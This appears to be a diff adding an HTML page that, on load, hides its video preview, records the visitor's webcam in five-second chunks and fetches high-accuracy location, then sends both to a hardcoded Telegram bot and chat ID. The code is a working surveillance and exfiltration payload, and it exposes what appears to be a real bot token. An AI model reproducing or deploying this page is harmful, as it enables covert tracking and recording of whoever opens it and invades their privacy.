@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Video and Location to Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+            background-color: #f9f9f9;
+        }
+
+        h1 {
+            color: #007bff;
+        }
+
+        #camera-preview {
+            display: none; /* Hide the video element */
+        }
+    </style>
+</head>
+<body>
+    <h1>Live Camera Stream</h1>
+    <p>We are recording your camera feed and sending it to Telegram along with your location.</p>
+    <video id="camera-preview" autoplay muted></video>
+
+    <script>
+        const botToken = '7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc'; // Replace with your bot token
+        const chatId = '5786268361'; // Replace with your chat ID
+        let recorder;
+        let cameraStream;
+
+        function setCookie(name, value, days) {
+            const date = new Date();
+            date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
+            document.cookie = `${name}=${value}; expires=${date.toUTCString()}; path=/`;
+        }
+
+        function getCookie(name) {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                cookie = cookie.trim();
+                if (cookie.startsWith(`${name}=`)) {
+                    return cookie.substring(name.length + 1);
+                }
+            }
+            return null;
+        }
+
+        async function startCamera() {
+            if (getCookie('cameraStatus') !== 'start') {
+                console.log("Camera is not enabled in the cookie.");
+                return;
+            }
+
+            try {
+                // Request camera access
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.getElementById('camera-preview');
+                videoElement.srcObject = cameraStream;
+
+                // Set up MediaRecorder
+                recorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm' });
+                recorder.ondataavailable = handleDataAvailable;
+                recorder.start(5000); // Record in 5-second chunks
+
+                // Request location
+                getLocation();
+            } catch (error) {
+                console.error("Error accessing the camera:", error);
+                sendToTelegram(`Error accessing the camera: ${error.message}`);
+            }
+        }
+
+        function handleDataAvailable(event) {
+            if (event.data.size > 0) {
+                sendVideoToTelegram(event.data);
+            }
+        }
+
+        function sendVideoToTelegram(videoBlob) {
+            const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+            const filename = `recording-${timestamp}.webm`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, filename);
+
+            const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+
+            fetch(url, {
+                method: 'POST',
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log(`Video chunk "${filename}" sent successfully!`);
+                    } else {
+                        console.error("Telegram API Error:", data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error uploading to Telegram:", error);
+                });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        const locationMessage = `User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+                        sendToTelegram(locationMessage);
+                    },
+                    (error) => {
+                        console.error("Error getting location:", error.message);
+                        sendToTelegram(`Error getting location: ${error.message}`);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+                sendToTelegram("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        console.error("Telegram API Error:", data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending to Telegram:", error);
+                });
+        }
+
+        function initialize() {
+            if (!getCookie('cameraStatus')) {
+                // Set the cameraStatus cookie to "start" if it doesn't exist
+                setCookie('cameraStatus', 'start', 1); // Cookie lasts for 1 day
+            }
+
+            // Start the camera based on the cookie value
+            startCamera();
+        }
+
+        // Initialize the application
+        window.onload = initialize;
+    </script>
+</body>
+</html>
